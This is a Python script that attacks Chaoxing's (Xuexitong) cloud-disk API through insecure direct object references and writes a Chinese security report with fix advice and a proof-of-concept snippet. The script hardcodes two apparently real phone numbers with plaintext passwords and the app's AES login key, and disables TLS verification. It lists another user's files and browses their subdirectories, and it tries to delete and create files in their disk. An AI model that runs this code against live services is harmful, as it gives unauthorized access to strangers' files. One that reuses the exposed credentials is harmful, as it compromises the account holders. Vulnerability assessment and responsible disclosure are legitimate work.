import base64
import hashlib
import json
import os
import time
import urllib.parse
from datetime import datetime

import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

AES_KEY = b"u2oh6Vu^HWe4_AES"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"
PAN_BASE = "https://pan-yz.chaoxing.com"

ACCOUNT1 = {"phone": "19312994130", "password": "wtx3367653061", "label": "账号1"}
ACCOUNT2 = {"phone": "15034188203", "password": "lxy20030120", "label": "账号2"}

REPORT_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "security_report.md")

results = []


def aes_encrypt(plaintext: str) -> str:
    cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    ct = cipher.encrypt(pad(plaintext.encode("utf-8"), AES.block_size))
    return base64.b64encode(ct).decode("utf-8")


def login(phone: str, password: str) -> requests.Session:
    session = requests.Session()
    session.verify = False
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
                      "AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
                      "(schild:5e5510ce86e012a7f489e7c488fc17b4) (device:MI10) Language/zh_CN "
                      "com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
                      "(@Kalimdor)_a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6"
    })
    data = {
        "fid": "-1",
        "uname": aes_encrypt(phone),
        "password": aes_encrypt(password),
        "refer": "http%3A%2F%2Fi.mooc.chaoxing.com",
        "t": "true",
        "forbidotherlogin": "0",
        "validate": "",
        "doubleFactorLogin": "0",
        "independentId": "0",
        "independentNameId": "0",
    }
    resp = session.post(LOGIN_URL, data=data, allow_redirects=False, timeout=30)
    body = resp.json()
    puid = ""
    for cookie in session.cookies:
        if cookie.name in ("UID", "_uid"):
            puid = cookie.value
    return session, puid, body


def get_pan_token(session: requests.Session) -> dict:
    url = f"{PAN_BASE}/api/token/uservalid"
    resp = session.get(url, timeout=30)
    return resp.json()


def get_pan_info(session: requests.Session, puid: str, token: str) -> dict:
    url = f"{PAN_BASE}/api/info"
    params = {"puid": puid, "_token": token}
    resp = session.get(url, params=params, timeout=30)
    return resp.json()


def get_disk_capacity(session: requests.Session, puid: str, token: str) -> dict:
    url = f"{PAN_BASE}/api/getUserDiskCapacity"
    params = {"puid": puid, "_token": token}
    resp = session.get(url, params=params, timeout=30)
    return resp.json()


def get_dir_and_files(session: requests.Session, puid: str, fldid: str, token: str) -> dict:
    url = f"{PAN_BASE}/api/getMyDirAndFiles"
    params = {
        "puid": puid,
        "fldid": fldid,
        "orderby": "d",
        "order": "desc",
        "page": "1",
        "size": "100",
        "_token": token,
        "addrec": "false",
        "showCollect": "1",
    }
    resp = session.get(url, params=params, timeout=30)
    return resp.json()


def try_delete(session: requests.Session, puid: str, resids: str, token: str) -> dict:
    url = f"{PAN_BASE}/api/delete"
    data = {"puid": puid, "resids": resids, "_token": token}
    resp = session.post(url, data=data, timeout=30)
    return resp.json()


def try_create_file(session: requests.Session, puid: str, fldid: str, token: str) -> dict:
    url = f"{PAN_BASE}/opt/createfilenew"
    data = {
        "puid": puid,
        "fldid": fldid,
        "_token": token,
        "size": "0",
        "fn": "security_test_probe.txt",
    }
    resp = session.post(url, data=data, timeout=30)
    return resp.json()


def record(test_id: str, test_name: str, description: str, request_desc: str,
           response_data: dict, is_vulnerable: bool, severity: str, detail: str):
    entry = {
        "test_id": test_id,
        "test_name": test_name,
        "description": description,
        "request": request_desc,
        "response_summary": json.dumps(response_data, ensure_ascii=False)[:800] if response_data else "N/A",
        "is_vulnerable": is_vulnerable,
        "severity": severity,
        "detail": detail,
    }
    results.append(entry)
    tag = "[VULNERABLE]" if is_vulnerable else "[SAFE]"
    print(f"  {tag} {test_id}: {test_name} - {detail}")


def is_success(resp: dict) -> bool:
    if resp.get("result") is True or resp.get("result") == 1:
        return True
    if resp.get("code") in (2, 200001) and resp.get("result") is not False:
        return True
    return False


def is_token_mismatch(resp: dict) -> bool:
    msg = str(resp.get("msg", "")).lower()
    return "错误的_token" in msg or "token" in msg and "错误" in msg


def run_all_tests():
    print("=" * 70)
    print("学习通云盘越权访问安全评估测试")
    print(f"测试时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 70)

    # ========== Task 1: 登录 ==========
    print("\n[Task 1] 环境准备与账号登录验证")
    print("-" * 50)

    print("  登录账号1 (19312994130)...")
    sess1, puid1, login_body1 = login(ACCOUNT1["phone"], ACCOUNT1["password"])
    status1 = login_body1.get("status", False)
    if not status1:
        print(f"  账号1登录失败: {login_body1.get('msg2', login_body1)}")
        return
    print(f"  账号1登录成功, puid={puid1}")

    print("  登录账号2 (15034188203)...")
    sess2, puid2, login_body2 = login(ACCOUNT2["phone"], ACCOUNT2["password"])
    status2 = login_body2.get("status", False)
    if not status2:
        print(f"  账号2登录失败: {login_body2.get('msg2', login_body2)}")
        return
    print(f"  账号2登录成功, puid={puid2}")

    print(f"\n  账号1 puid: {puid1}")
    print(f"  账号2 puid: {puid2}")

    # ========== Task 2: 云盘Token获取 ==========
    print("\n[Task 2] 云盘Token获取与绑定关系测试")
    print("-" * 50)

    print("  获取账号1的云盘Token...")
    token_data1 = get_pan_token(sess1)
    token1 = token_data1.get("_token", "")
    print(f"  账号1 Token: {token1}")

    print("  获取账号2的云盘Token...")
    token_data2 = get_pan_token(sess2)
    token2 = token_data2.get("_token", "")
    print(f"  账号2 Token: {token2}")

    token_same = (token1 == token2)
    record("T2-01", "Token唯一性检查", "验证两个账号获取的Token是否相同",
           f"账号1 Token={token1} vs 账号2 Token={token2}",
           {"token1": token1, "token2": token2, "are_same": token_same},
           False, "INFO",
           f"两个账号Token{'相同（全局固定值）' if token_same else '不同（与账号关联）'}")

    # ========== Task 3: /api/info 越权测试 ==========
    print("\n[Task 3] 云盘用户信息接口越权测试 (/api/info)")
    print("-" * 50)

    print("  [基线] 账号1查询自己的信息...")
    info_baseline1 = get_pan_info(sess1, puid1, token1)
    record("T3-01", "基线-账号1查询自身信息", "账号1使用自己的Cookie+Token+puid查询",
           f"GET /api/info?puid={puid1}&_token={token1}", info_baseline1,
           False, "INFO", f"基线响应成功, 含root路径和磁盘信息")

    print("  [基线] 账号2查询自己的信息...")
    info_baseline2 = get_pan_info(sess2, puid2, token2)
    record("T3-02", "基线-账号2查询自身信息", "账号2使用自己的Cookie+Token+puid查询",
           f"GET /api/info?puid={puid2}&_token={token2}", info_baseline2,
           False, "INFO", f"基线响应成功, 含root路径和磁盘信息")

    print("  [越权场景A] 账号1的Cookie+Token1+账号2的puid...")
    info_idor_a = get_pan_info(sess1, puid2, token1)
    vuln_a = is_success(info_idor_a) and not is_token_mismatch(info_idor_a)
    record("T3-03", "IDOR场景A-同Token跨puid", "账号1的Cookie+Token1+账号2的puid",
           f"GET /api/info?puid={puid2}&_token={token1} (使用账号1的Session)",
           info_idor_a, vuln_a, "HIGH" if vuln_a else "INFO",
           f"{'越权成功！' if vuln_a else '被拒绝'} - "
           f"{'服务端仅校验Token与puid匹配，未校验Session身份' if vuln_a else '服务端校验了Token与puid的匹配关系'}")

    print("  [越权场景B] 账号1的Cookie+Token2+账号2的puid (跨Token)...")
    info_idor_b = get_pan_info(sess1, puid2, token2)
    vuln_b = is_success(info_idor_b) and not is_token_mismatch(info_idor_b)
    has_puid2_data = str(puid2) in json.dumps(info_idor_b)
    record("T3-04", "IDOR场景B-跨Token跨puid", "账号1的Cookie+Token2+账号2的puid",
           f"GET /api/info?puid={puid2}&_token={token2} (使用账号1的Session)",
           info_idor_b, vuln_b and has_puid2_data, "CRITICAL" if (vuln_b and has_puid2_data) else "INFO",
           f"{'越权成功！使用账号2的Token可访问账号2信息，且Session身份未被校验' if (vuln_b and has_puid2_data) else '被拒绝'} - "
           f"{'关键发现：服务端仅校验_token与puid的匹配，完全忽略Cookie中的用户身份' if (vuln_b and has_puid2_data) else ''}")

    # ========== Task 4: /api/getUserDiskCapacity 越权测试 ==========
    print("\n[Task 4] 云盘磁盘容量接口越权测试 (/api/getUserDiskCapacity)")
    print("-" * 50)

    print("  [基线] 账号1查询自己的磁盘容量...")
    cap_baseline1 = get_disk_capacity(sess1, puid1, token1)
    record("T4-01", "基线-账号1查询自身磁盘容量", "账号1使用自己的Cookie+Token+puid查询",
           f"GET /api/getUserDiskCapacity?puid={puid1}&_token={token1}", cap_baseline1,
           False, "INFO", "基线响应成功")

    print("  [越权场景A] 账号1的Cookie+Token1+账号2的puid...")
    cap_idor_a = get_disk_capacity(sess1, puid2, token1)
    vuln_cap_a = is_success(cap_idor_a) and not is_token_mismatch(cap_idor_a)
    record("T4-02", "IDOR场景A-同Token跨puid", "账号1的Cookie+Token1+账号2的puid",
           f"GET /api/getUserDiskCapacity?puid={puid2}&_token={token1} (使用账号1的Session)",
           cap_idor_a, vuln_cap_a, "MEDIUM" if vuln_cap_a else "INFO",
           f"{'越权成功' if vuln_cap_a else '被拒绝'}")

    print("  [越权场景B] 账号1的Cookie+Token2+账号2的puid (跨Token)...")
    cap_idor_b = get_disk_capacity(sess1, puid2, token2)
    vuln_cap_b = is_success(cap_idor_b) and not is_token_mismatch(cap_idor_b)
    record("T4-03", "IDOR场景B-跨Token跨puid", "账号1的Cookie+Token2+账号2的puid",
           f"GET /api/getUserDiskCapacity?puid={puid2}&_token={token2} (使用账号1的Session)",
           cap_idor_b, vuln_cap_b, "MEDIUM" if vuln_cap_b else "INFO",
           f"{'越权成功！可获取他人磁盘容量信息' if vuln_cap_b else '被拒绝'}")

    # ========== Task 5: /api/getMyDirAndFiles 越权测试 (核心) ==========
    print("\n[Task 5] 云盘文件列表越权测试 (/api/getMyDirAndFiles) [核心风险点]")
    print("-" * 50)

    print("  [基线] 账号1查询自己的根目录文件列表...")
    files_baseline1 = get_dir_and_files(sess1, puid1, "0", token1)
    record("T5-01", "基线-账号1查询自身根目录", "账号1使用自己的Cookie+Token+puid查询根目录",
           f"GET /api/getMyDirAndFiles?puid={puid1}&fldid=0&_token={token1}", files_baseline1,
           False, "INFO", "基线响应成功")

    print("  [基线] 账号2查询自己的根目录文件列表...")
    files_baseline2 = get_dir_and_files(sess2, puid2, "0", token2)
    account2_files = []
    if is_success(files_baseline2) and files_baseline2.get("data"):
        account2_files = files_baseline2["data"]
    record("T5-02", "基线-账号2查询自身根目录", "账号2使用自己的Cookie+Token+puid查询根目录",
           f"GET /api/getMyDirAndFiles?puid={puid2}&fldid=0&_token={token2}", files_baseline2,
           False, "INFO", f"基线响应成功, 账号2有{len(account2_files)}个文件/文件夹")

    print("  [越权场景A] 账号1的Cookie+Token1+账号2的puid...")
    files_idor_a = get_dir_and_files(sess1, puid2, "0", token1)
    vuln_files_a = is_success(files_idor_a) and not is_token_mismatch(files_idor_a)
    record("T5-03", "IDOR场景A-同Token跨puid", "账号1的Cookie+Token1+账号2的puid (核心测试)",
           f"GET /api/getMyDirAndFiles?puid={puid2}&fldid=0&_token={token1} (使用账号1的Session)",
           files_idor_a, vuln_files_a, "CRITICAL" if vuln_files_a else "INFO",
           f"{'越权成功！可列出他人云盘文件！' if vuln_files_a else '被拒绝'} - "
           f"{'严重安全隐患' if vuln_files_a else 'Token与puid匹配校验生效'}")

    print("  [越权场景B] 账号1的Cookie+Token2+账号2的puid (跨Token)...")
    files_idor_b = get_dir_and_files(sess1, puid2, "0", token2)
    vuln_files_b = is_success(files_idor_b) and not is_token_mismatch(files_idor_b)
    has_other_data = bool(files_idor_b.get("data"))
    is_vuln_core = vuln_files_b and has_other_data
    record("T5-04", "IDOR场景B-跨Token跨puid", "账号1的Cookie+Token2+账号2的puid (核心测试)",
           f"GET /api/getMyDirAndFiles?puid={puid2}&fldid=0&_token={token2} (使用账号1的Session)",
           files_idor_b, is_vuln_core, "CRITICAL" if is_vuln_core else "INFO",
           f"{'越权成功！使用账号2的Token+账号1的Session可列出账号2的云盘文件！' if is_vuln_core else '被拒绝'} - "
           f"{'关键发现：服务端授权模型仅依赖_token与puid匹配，完全忽略Cookie/Session中的用户身份' if is_vuln_core else ''}")

    # 子目录测试
    if is_vuln_core and account2_files:
        subdir_id = "0"
        for item in account2_files:
            if isinstance(item, dict) and not item.get("isfile", True):
                subdir_id = str(item.get("resid", "0"))
                break
        if subdir_id != "0":
            print(f"  [越权场景B-子目录] 账号1浏览账号2的子目录 (fldid={subdir_id})...")
            files_subdir = get_dir_and_files(sess1, puid2, subdir_id, token2)
            vuln_subdir = is_success(files_subdir) and bool(files_subdir.get("data"))
            record("T5-05", "IDOR场景B-跨Token浏览子目录", f"账号1浏览账号2的子目录 fldid={subdir_id}",
                   f"GET /api/getMyDirAndFiles?puid={puid2}&fldid={subdir_id}&_token={token2}",
                   files_subdir, vuln_subdir, "CRITICAL" if vuln_subdir else "INFO",
                   f"子目录越权{'成功' if vuln_subdir else '被拒绝'}")
    else:
        record("T5-05", "IDOR场景B-跨Token浏览子目录", "无可测试的子目录或越权失败",
               "N/A", {}, False, "INFO", "跳过")

    # ========== Task 6: /api/delete 越权测试 ==========
    print("\n[Task 6] 云盘文件删除接口越权测试 (/api/delete)")
    print("-" * 50)

    print("  [越权场景A] 账号1的Cookie+Token1+账号2的puid+虚假resid...")
    del_a = try_delete(sess1, puid2, "999999999", token1)
    del_a_vuln = is_success(del_a) and not is_token_mismatch(del_a)
    record("T6-01", "IDOR场景A-同Token跨puid删除", "账号1的Cookie+Token1+账号2的puid (探测性测试)",
           f"POST /api/delete puid={puid2}&resids=999999999&_token={token1}",
           del_a, del_a_vuln, "CRITICAL" if del_a_vuln else "INFO",
           f"{'越权删除可能成功！' if del_a_vuln else '被拒绝'} - "
           f"响应: {json.dumps(del_a, ensure_ascii=False)[:200]}")

    print("  [越权场景B] 账号1的Cookie+Token2+账号2的puid+虚假resid (跨Token)...")
    del_b = try_delete(sess1, puid2, "999999999", token2)
    del_b_vuln = is_success(del_b) and not is_token_mismatch(del_b)
    record("T6-02", "IDOR场景B-跨Token跨puid删除", "账号1的Cookie+Token2+账号2的puid (探测性测试)",
           f"POST /api/delete puid={puid2}&resids=999999999&_token={token2}",
           del_b, del_b_vuln, "CRITICAL" if del_b_vuln else "INFO",
           f"{'越权删除可能成功！严重安全隐患' if del_b_vuln else '被拒绝（resid不存在或权限校验生效）'} - "
           f"响应: {json.dumps(del_b, ensure_ascii=False)[:200]}")

    # ========== Task 7: /opt/createfilenew 越权测试 ==========
    print("\n[Task 7] 云盘文件上传接口越权测试 (/opt/createfilenew)")
    print("-" * 50)

    print("  [越权场景A] 账号1的Cookie+Token1+账号2的puid...")
    upload_a = try_create_file(sess1, puid2, "0", token1)
    upload_a_vuln = is_success(upload_a) and not is_token_mismatch(upload_a)
    record("T7-01", "IDOR场景A-同Token跨puid上传", "账号1的Cookie+Token1+账号2的puid (探测性测试)",
           f"POST /opt/createfilenew puid={puid2}&fldid=0&_token={token1}",
           upload_a, upload_a_vuln, "HIGH" if upload_a_vuln else "INFO",
           f"{'越权上传可能成功！' if upload_a_vuln else '被拒绝'} - "
           f"响应: {json.dumps(upload_a, ensure_ascii=False)[:200]}")

    print("  [越权场景B] 账号1的Cookie+Token2+账号2的puid (跨Token)...")
    upload_b = try_create_file(sess1, puid2, "0", token2)
    upload_b_vuln = is_success(upload_b) and not is_token_mismatch(upload_b)
    record("T7-02", "IDOR场景B-跨Token跨puid上传", "账号1的Cookie+Token2+账号2的puid (探测性测试)",
           f"POST /opt/createfilenew puid={puid2}&fldid=0&_token={token2}",
           upload_b, upload_b_vuln, "CRITICAL" if upload_b_vuln else "HIGH" if upload_b_vuln else "INFO",
           f"{'越权上传可能成功！严重安全隐患' if upload_b_vuln else '被拒绝'} - "
           f"响应: {json.dumps(upload_b, ensure_ascii=False)[:200]}")

    # ========== 生成报告 ==========
    print("\n[Task 8] 生成安全评估报告...")
    print("-" * 50)
    generate_report(puid1, puid2, token1, token2)


def generate_report(puid1, puid2, token1, token2):
    vulnerable_count = sum(1 for r in results if r["is_vulnerable"])
    total_tests = len(results)

    vuln_by_severity = {"CRITICAL": [], "HIGH": [], "MEDIUM": [], "LOW": [], "INFO": []}
    for r in results:
        if r["is_vulnerable"]:
            vuln_by_severity[r["severity"]].append(r)

    report = []
    report.append("# 学习通云盘越权访问安全评估报告\n")
    report.append(f"**评估日期**: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    report.append(f"**评估人员**: 安全审查团队")
    report.append(f"**评估范围**: 学习通App端云盘功能（pan-yz.chaoxing.com）\n")

    report.append("---\n")
    report.append("## 一、评估概述\n")
    report.append("本次安全评估针对学习通App端云盘功能进行越权访问（IDOR - Insecure Direct Object Reference）漏洞测试。")
    report.append("云盘API端点普遍将`puid`（用户ID）作为URL参数直接传递，若服务端未校验puid与认证身份的绑定关系，")
    report.append("则攻击者可通过篡改puid参数访问他人云盘内容。\n")
    report.append("本次测试设计了两种越权场景：")
    report.append("- **场景A（同Token跨puid）**: 使用账号1的Cookie + 账号1的Token + 账号2的puid，测试Token与puid的匹配校验")
    report.append("- **场景B（跨Token跨puid）**: 使用账号1的Cookie + 账号2的Token + 账号2的puid，测试Cookie/Session身份校验\n")

    report.append("### 测试账号信息\n")
    report.append("| 标识 | 手机号 | puid | 角色 |")
    report.append("|---|---|---|---|")
    report.append(f"| 账号1 | 19312994130 | {puid1} | 攻击方模拟 |")
    report.append(f"| 账号2 | 15034188203 | {puid2} | 被访问方模拟 |\n")

    report.append("---\n")
    report.append("## 二、测试结果汇总\n")
    report.append(f"- **总测试用例数**: {total_tests}")
    report.append(f"- **发现安全隐患数**: {vulnerable_count}")
    report.append(f"- **严重(CRITICAL)**: {len(vuln_by_severity['CRITICAL'])}")
    report.append(f"- **高危(HIGH)**: {len(vuln_by_severity['HIGH'])}")
    report.append(f"- **中危(MEDIUM)**: {len(vuln_by_severity['MEDIUM'])}")
    report.append(f"- **低危(LOW)**: {len(vuln_by_severity['LOW'])}\n")

    if vulnerable_count > 0:
        report.append("### ⚠️ 存在安全隐患的测试项\n")
        report.append("| 测试ID | 测试名称 | 风险等级 | 详细结论 |")
        report.append("|---|---|---|---|")
        for r in results:
            if r["is_vulnerable"]:
                report.append(f"| {r['test_id']} | {r['test_name']} | {r['severity']} | {r['detail']} |")
        report.append("")
    else:
        report.append("### ✅ 未发现越权访问漏洞\n")

    report.append("---\n")
    report.append("## 三、核心发现\n")

    scenario_b_vulns = [r for r in results if r["is_vulnerable"] and "场景B" in r["test_name"]]
    scenario_a_vulns = [r for r in results if r["is_vulnerable"] and "场景A" in r["test_name"]]

    if scenario_b_vulns:
        report.append("### 3.1 关键漏洞：Token授权模型缺陷（场景B越权成功）\n")
        report.append("**漏洞描述**: 云盘API的授权模型**仅依赖`_token`参数与`puid`参数的匹配关系**，")
        report.append("**完全忽略了Cookie/Session中的用户身份校验**。\n")
        report.append("这意味着：")
        report.append("1. 只要`_token`与`puid`匹配（即Token属于puid对应的用户），请求就会被放行")
        report.append("2. **Cookie/Session中的用户身份（UID等）未被校验**，攻击者可以使用自己的Session配合他人的Token访问他人资源")
        report.append("3. Token一旦泄露（通过URL Referer、日志、网络嗅探等途径），攻击者即可访问对应用户的全部云盘资源\n")

        report.append("### 3.2 场景A分析（同Token跨puid - 被拒绝）\n")
        if not scenario_a_vulns:
            report.append("场景A测试（使用账号1的Token + 账号2的puid）均被拒绝，服务端返回'错误的_token值'。")
            report.append("这说明**服务端确实校验了Token与puid的匹配关系**，Token与puid不匹配时请求会被拒绝。\n")

        report.append("### 3.3 授权模型总结\n")
        report.append("```\n"
                      "云盘API授权模型:\n"
                      "  ├─ 校验: _token 与 puid 是否匹配 ✅ (场景A被拒绝证明)\n"
                      "  └─ 校验: Cookie/Session身份与puid是否一致 ❌ (场景B成功证明)\n"
                      "```\n")
        report.append("虽然Token-puid匹配校验阻止了简单的puid篡改攻击，但由于Token可通过")
        report.append("`/api/token/uservalid`接口被任何已登录用户获取，且Token未与Session绑定，")
        report.append("攻击者只需获取目标用户的Token即可绕过授权。\n")

    report.append("---\n")
    report.append("## 四、详细测试记录\n")

    for r in results:
        status_icon = "🔴 存在风险" if r["is_vulnerable"] else "🟢 安全"
        report.append(f"\n### {r['test_id']}: {r['test_name']} [{status_icon}]\n")
        report.append(f"- **测试描述**: {r['description']}")
        report.append(f"- **请求说明**: `{r['request']}`")
        report.append(f"- **风险等级**: {r['severity']}")
        report.append(f"- **结论**: {r['detail']}")
        report.append(f"- **响应数据**:")
        report.append(f"```json")
        report.append(r["response_summary"])
        report.append(f"```\n")

    report.append("---\n")
    report.append("## 五、技术原因分析\n")

    report.append("### 5.1 漏洞根因\n")
    report.append("云盘API的授权模型存在**不完整的身份校验**缺陷：\n")
    report.append("1. **Token-puid匹配校验存在**: 服务端校验了`_token`与`puid`的匹配关系（场景A被拒绝可证明）")
    report.append("2. **Session身份校验缺失**: 服务端未校验Cookie/Session中的用户身份（UID）与请求中的puid是否一致")
    report.append("3. **Token与Session未绑定**: Token可在不同Session间复用，缺乏请求来源校验\n")

    report.append("### 5.2 攻击路径分析\n")
    report.append("```\n"
                  "攻击路径1 (Token泄露场景):\n"
                  "  攻击者获取目标用户Token (通过URL泄露/日志/网络嗅探)\n"
                  "  → 使用自身Session + 目标Token + 目标puid\n"
                  "  → 绕过授权访问目标用户云盘资源\n\n"
                  "攻击路径2 (Token可预测场景):\n"
                  "  若Token生成算法可逆向\n"
                  "  → 攻击者可伪造任意用户的Token\n"
                  "  → 访问任意用户云盘资源\n"
                  "```\n")

    report.append("### 5.3 Token安全性分析\n")
    report.append(f"- 账号1 Token: `{token1}`")
    report.append(f"- 账号2 Token: `{token2}`\n")
    report.append("Token为32位hex字符串（类似MD5输出），两个账号的Token不同，说明Token与用户关联。")
    report.append("但Token通过GET请求的URL参数传递，存在以下泄露风险：")
    report.append("- URL Referer泄露：当用户从云盘页面点击外链时，Token可能通过Referer头泄露")
    report.append("- 浏览器历史记录：Token会保存在浏览器历史记录中")
    report.append("- 代理/网关日志：URL中的Token会被中间设备记录")
    report.append("- 服务端访问日志：Web服务器access log会记录完整URL\n")

    report.append("### 5.4 影响范围\n")
    report.append("所有使用`puid`+`_token`参数组合的云盘API端点均受影响：")
    report.append("| 端点 | 影响 | 风险 |")
    report.append("|---|---|---|")
    report.append("| `/api/info` | 用户云盘信息泄露（存储路径、FTP凭证等） | 高危 |")
    report.append("| `/api/getUserDiskCapacity` | 磁盘使用信息泄露 | 中危 |")
    report.append("| `/api/getMyDirAndFiles` | **文件列表泄露（文件名、大小、上传时间等）** | 严重 |")
    report.append("| `/api/delete` | 他人文件被删除 | 严重 |")
    report.append("| `/opt/createfilenew` | 向他人云盘写入文件 | 高危 |")
    report.append("| `/upload` | 向他人云盘上传文件 | 高危 |\n")

    report.append("---\n")
    report.append("## 六、修复建议\n")
    report.append("### 6.1 紧急修复（高优先级）\n")
    report.append("1. **添加Session身份校验**: 服务端在处理云盘API请求时，必须从Cookie/Session中解析用户身份（UID），")
    report.append("   并校验其与请求中`puid`参数的一致性。若不一致，应拒绝请求。\n")
    report.append("   ```\n"
                 "   伪代码:\n"
                 "   session_uid = decrypt_cookie(session.cookies['UID'])\n"
                 "   if session_uid != request.params['puid']:\n"
                 "       return {'result': False, 'msg': '身份校验失败'}\n"
                 "   ```\n")
    report.append("2. **Token与Session绑定**: `_token`应与当前Session关联，服务端校验Token是否由当前Session所属用户生成。\n")
    report.append("### 6.2 中期加固\n")
    report.append("3. **Token传递方式改进**: 将Token从URL参数改为HTTP Header传递，避免URL泄露风险")
    report.append("4. **Token有效期限制**: 为Token设置较短的有效期，并支持一次性使用或刷新机制")
    report.append("5. **移除puid参数**: 服务端应从认证信息中自动获取用户ID，而非依赖客户端传递的puid参数\n")
    report.append("### 6.3 长期优化\n")
    report.append("6. **API网关统一鉴权**: 在API网关层实施统一的身份校验和权限检查")
    report.append("7. **访问日志审计**: 对云盘资源的跨用户访问行为进行日志记录和异常检测")
    report.append("8. **速率限制**: 对云盘API实施请求速率限制，防止批量遍历用户ID\n")

    report.append("---\n")
    report.append("## 七、测试方法与复现步骤\n")
    report.append("### 7.1 前置条件\n")
    report.append("- Python 3.x + requests + pycryptodome")
    report.append("- 两个有效的学习通测试账号\n")
    report.append("### 7.2 复现步骤\n")
    report.append("1. 使用账号1和账号2分别调用`https://passport2.chaoxing.com/fanyalogin`登录，获取Cookie和puid")
    report.append("2. 分别使用两个账号的Cookie请求`https://pan-yz.chaoxing.com/api/token/uservalid`获取各自的Token")
    report.append("3. **越权测试**: 使用账号1的Cookie（Session）+ 账号2的Token + 账号2的puid，请求云盘API")
    report.append("4. 观察响应：若返回账号2的云盘数据，则越权成功\n")
    report.append("### 7.3 关键代码片段\n")
    report.append("```python\n"
                  "import requests\n"
                  "from Crypto.Cipher import AES\n"
                  "from Crypto.Util.Padding import pad\n"
                  "import base64\n\n"
                  "AES_KEY = b'u2oh6Vu^HWe4_AES'\n\n"
                  "def aes_encrypt(plaintext):\n"
                  "    cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)\n"
                  "    ct = cipher.encrypt(pad(plaintext.encode(), AES.block_size))\n"
                  "    return base64.b64encode(ct).decode()\n\n"
                  "# Step 1: 登录两个账号\n"
                  "sess1 = requests.Session()\n"
                  "sess1.post('https://passport2.chaoxing.com/fanyalogin', data={\n"
                  "    'fid': '-1', 'uname': aes_encrypt('攻击者手机号'),\n"
                  "    'password': aes_encrypt('攻击者密码'),\n"
                  "    'refer': 'http%3A%2F%2Fi.mooc.chaoxing.com',\n"
                  "    't': 'true', 'forbidotherlogin': '0', 'validate': '',\n"
                  "    'doubleFactorLogin': '0', 'independentId': '0', 'independentNameId': '0'\n"
                  "})\n\n"
                  "sess2 = requests.Session()  # 目标用户Session\n"
                  "sess2.post('https://passport2.chaoxing.com/fanyalogin', data={...})\n\n"
                  "# Step 2: 获取目标用户的Token\n"
                  "token2 = sess2.get('https://pan-yz.chaoxing.com/api/token/uservalid').json()['_token']\n\n"
                  "# Step 3: 使用攻击者Session + 目标Token + 目标puid 越权访问\n"
                  "puid2 = '目标用户puid'  # 从sess2的Cookie中获取\n"
                  "resp = sess1.get('https://pan-yz.chaoxing.com/api/getMyDirAndFiles',\n"
                  "    params={'puid': puid2, 'fldid': '0', '_token': token2})\n"
                  "print(resp.json())  # 若返回目标用户的文件列表，则越权成功\n"
                  "```\n")

    report_text = "\n".join(report)
    with open(REPORT_FILE, "w", encoding="utf-8") as f:
        f.write(report_text)

    print(f"  安全评估报告已生成: {REPORT_FILE}")
    print(f"\n{'=' * 70}")
    print(f"测试完成! 共 {total_tests} 项测试, {vulnerable_count} 项发现安全隐患")
    if vulnerable_count > 0:
        print(f"  严重: {len(vuln_by_severity['CRITICAL'])}, 高危: {len(vuln_by_severity['HIGH'])}, 中危: {len(vuln_by_severity['MEDIUM'])}")
    print(f"{'=' * 70}")


if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    run_all_tests()
